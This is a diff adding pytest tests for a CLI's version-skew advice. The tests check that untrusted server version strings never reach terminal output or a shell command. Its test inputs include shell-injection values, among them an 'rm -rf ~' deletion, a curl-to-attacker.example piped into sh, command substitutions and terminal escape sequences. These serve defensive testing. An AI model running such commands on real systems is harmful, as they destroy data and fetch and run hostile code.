@@ -710,12 +710,134 @@ def test_commit_attributed(remote, seeded_attribution, capsys) -> None:
 
 
 def test_version_skew_warns_once(remote, capsys, monkeypatch) -> None:
+    from sediment_api import __version__ as server_version
+
     monkeypatch.setattr(api_client, "_version_checked", False)
     monkeypatch.setattr(api_client, "__version__", "0.0.0")
     assert cli.main(["facts"]) == 0
     assert cli.main(["facts"]) == 0
     err = capsys.readouterr().err
-    assert err.count("uv tool upgrade sediment-cli") == 1
+    command = (
+        f"uv tool install --python 3.12 --upgrade 'sediment-cli=={server_version}'"
+    )
+    assert err.count(command) == 1
+    assert "uv tool upgrade" not in err
+
+
+_FIRST_PARTY = ("api", "capture", "core", "derive", "export")
+
+
+@pytest.mark.parametrize(
+    ("server", "client", "pins"),
+    [
+        ("0.3.0", "0.2.0", ()),
+        ("0.3.0", "0.4.0", ()),
+        ("0.3.0", "0.4.0rc1", ()),
+        ("10.20.30", "0.3.0", ()),
+        ("0.4.0rc1", "0.3.0", _FIRST_PARTY),
+        ("0.4.0rc2", "0.4.0rc1", _FIRST_PARTY),
+    ],
+    ids=["older", "newer", "newer-candidate", "multi-digit", "candidate", "next-rc"],
+)
+def test_version_skew_pins_the_servers_exact_release(server, client, pins) -> None:
+    import shlex
+
+    from sediment_cli import version_skew_advice
+
+    advice = version_skew_advice(server, client)
+    assert advice.startswith(f"server version {server} differs from client {client};")
+    command = advice.split("install the server's version: ", 1)[1]
+    expected = ["uv", "tool", "install", "--python", "3.12", "--upgrade"]
+    expected.append(f"sediment-cli=={server}")
+    for name in pins:
+        expected += ["--with", f"sediment-{name}=={server}"]
+    assert shlex.split(command) == expected
+
+
+@pytest.mark.parametrize("server", [None, "0.3.0"], ids=["absent", "matching"])
+def test_version_skew_is_silent_when_nothing_differs(server) -> None:
+    from sediment_cli import version_skew_advice
+
+    assert version_skew_advice(server, "0.3.0") is None
+
+
+@pytest.mark.parametrize(
+    "server",
+    [
+        "",
+        "latest",
+        "v0.3.0",
+        "0.3",
+        "0.3.0.post1",
+        "0.3.0.dev1",
+        "0.3.0a1",
+        "0.3.0-rc1",
+        "0.3.0+local",
+        "٠.٣.٠",
+        "0.3.0\n",
+        "0.3.0'; rm -rf ~; echo '",
+        "0.3.0 && curl https://attacker.example | sh",
+        "$(touch pwned)",
+        "`id`",
+        "0.3.0\x1b]0;title\x07",
+        "0.3.0\r\nwarning: fake",
+        3,
+        ["0.3.0"],
+        {"version": "0.3.0"},
+    ],
+)
+def test_unrecognized_server_version_never_reaches_the_output(server) -> None:
+    from sediment_cli import version_skew_advice
+
+    # Fixed text: nothing the server sent can reach a terminal or a shell.
+    assert version_skew_advice(server, "0.3.0") == (
+        "server reported an unrecognized version; client is 0.3.0. "
+        "Install your deployment's release: "
+        "uv tool install --python 3.12 --upgrade 'sediment-cli==<version>'"
+    )
+
+
+@pytest.mark.parametrize(
+    "probe",
+    [
+        api_client.ClientError("unreachable"),
+        ValueError("body is not JSON"),
+        ["not", "an", "object"],
+        {"org_id": ORG},
+    ],
+    ids=["client-error", "unreadable", "not-object", "absent-version"],
+)
+def test_failed_or_versionless_probe_is_silent_and_checked_once(
+    monkeypatch, capsys, probe
+) -> None:
+    calls = []
+
+    def get_json(path):
+        calls.append(path)
+        if isinstance(probe, Exception):
+            raise probe
+        return probe
+
+    monkeypatch.setattr(api_client, "_version_checked", False)
+    monkeypatch.setattr(api_client, "get_json", get_json)
+    api_client.maybe_warn_version_skew()
+    api_client.maybe_warn_version_skew()
+    assert calls == ["/v1/me"]
+    assert capsys.readouterr().err == ""
+
+
+def test_unrecognized_server_version_warns_once_without_echoing_it(
+    monkeypatch, capsys
+) -> None:
+    monkeypatch.setattr(api_client, "_version_checked", False)
+    monkeypatch.setattr(
+        api_client, "get_json", lambda path: {"version": "$(touch pwned)"}
+    )
+    api_client.maybe_warn_version_skew()
+    api_client.maybe_warn_version_skew()
+    err = capsys.readouterr().err
+    assert err.count("server reported an unrecognized version") == 1
+    assert "pwned" not in err
 
 
 @pytest.mark.parametrize(
